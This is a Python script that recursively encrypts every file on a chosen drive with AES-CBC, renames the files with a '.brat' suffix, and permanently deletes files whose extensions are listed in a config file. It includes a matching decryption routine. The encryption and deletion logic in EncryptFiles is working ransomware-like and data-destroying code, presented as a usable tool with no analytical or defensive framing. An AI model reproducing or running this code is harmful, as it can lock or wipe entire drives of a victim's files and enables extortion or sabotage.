import os
from pathlib import Path
import json
import threading
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

preventDeletion = {
    "$RECYCLE.BIN",
    "System Volume Information"
}

currentThreads = []

def generate_key_iv():
    current_directory = os.getcwd()
    security_json = os.path.join(current_directory, 'security.json')

    key = None
    iv = None

    if os.path.exists(security_json):
        with open(security_json, 'r') as f:
            json_contents = json.load(f)

            if json_contents.get("KEY") == False:
                key = os.urandom(32)
                json_contents["KEY"] = key.hex()
            else:
                key = bytes.fromhex(json_contents.get("KEY", ""))

            if json_contents.get("IV") == False:
                iv = os.urandom(16)
                json_contents["IV"] = iv.hex()
            else:
                iv = bytes.fromhex(json_contents.get("IV", ""))

        with open(security_json, 'w') as f:
            json.dump(json_contents, f)
    
    return key, iv

def encrypt_data(key, iv, plaintext):
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(plaintext) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    
    return ciphertext

def decrypt_data(key, iv, ciphertext):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(ciphertext) + decryptor.finalize()

    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    plaintext = unpadder.update(padded_data) + unpadder.finalize()
    
    return plaintext

key, iv = generate_key_iv()
if key is None or iv is None:
    raise Exception("Failed to generate or load key and IV")

def GetAppInformation():
    current_directory = os.getcwd()
    return os.path.join(current_directory, 'info.json')

def GetProtectedDrives():
    json_file = GetAppInformation()
    try:
        with open(json_file, 'r') as f:
            json_file_contents = json.load(f)
            return json_file_contents["ProtectedDrives"]
    except Exception as e:
        return f'["Error"]: {e}'
    
protectedDrives = GetProtectedDrives()

def GetProgramVersion():
    json_file = GetAppInformation()
    try:
        with open(json_file, 'r') as f:
            json_file_contents = json.load(f)
            return json_file_contents["Version"]
    except Exception as e:
        return f'["Error"]: {e}'

def GetProtectedExtensions():
    json_file = GetAppInformation()
    try:
        with open(json_file, 'r') as f:
            json_file_contents = json.load(f)
            return json_file_contents["ProtectedFileExtensions"]
    except Exception as e:
        return f'["Error"]: {e}'
    
def GetDesignatedDrive(drive_name: str):
    if drive_name in protectedDrives:
        confirmation = str(input(f"The drive {drive_name}:/ has been added to a [protectDrive] section. Do you want to continue?: Y/N "))
        if confirmation not in ("Y", "y"):
            print("Operation cancelled.")
            quit()
               
    try:
        drive_path = f"{drive_name}:/"
        if os.path.exists(drive_path):
            return drive_path
        else:
            return f'Drive path does not exist: {drive_path}'
    except Exception as e:
        return str(e)

def EncryptFiles(designated_path):
    if os.path.exists(designated_path):
        for file in os.listdir(designated_path):
            if file not in preventDeletion:
                file_path = os.path.join(designated_path, file)
                if os.path.isdir(file_path):
                    new_thread = threading.Thread(target=EncryptFiles, args=(os.path.join(designated_path, file),)).start()
                    currentThreads.append(new_thread)
                else:
                    if not file.endswith(tuple(GetProtectedExtensions())):
                        if not file.endswith('.brat'):
                            def EncryptFileContents():
                                with open(file_path, 'rb') as f:
                                    file_contents = f.read()
                                with open(file_path, 'wb') as f:
                                    f.write(encrypt_data(key, iv, file_contents))
                            def RenameFile():
                                file_path_ = Path(file_path)
                                new_file_path = file_path_.with_suffix(file_path_.suffix + '.brat')
                                file_path_.rename(new_file_path)
                            EncryptFileContents()
                            RenameFile()
                            print(f"\n[Success]: Successfully encrypted: {file_path}")
                    else:
                        os.remove(file_path)
                        print(f"\n[Success]: Deleted: {file_path}")
    else:
        print(f"\n[Warning]: The drive '{designated_path}' does not exist!")
        quit()
        
def DecryptFiles(designated_path):
    if os.path.exists(designated_path):
        for file in os.listdir(designated_path):
            if file not in preventDeletion:
                file_path = os.path.join(designated_path, file)
                if os.path.isdir(file_path):
                    new_thread = threading.Thread(target=DecryptFiles, args=(os.path.join(designated_path, file),)).start()
                    currentThreads.append(new_thread)
                else:
                    if not file.endswith(tuple(GetProtectedExtensions())):
                        if file.endswith('.brat'):
                            def DecryptFileContents(file_path_):
                                with open(file_path_, 'rb') as f:
                                    file_contents = f.read()
                                with open(file_path_, 'wb') as f:
                                    f.write(decrypt_data(key, iv, file_contents))
                            def RenameFile():
                                file_path_ = Path(file_path)
                                new_file_path = str(file_path_).removesuffix('.brat')
                                file_path_.rename(new_file_path)
                                return new_file_path
                            new_file_path = RenameFile()
                            DecryptFileContents(new_file_path)
                            print(f"\n[Success]: Successfully decrypted: {file_path}")
                    else:
                        print(f"[Warning]: This file is unconfigurable: {file_path}")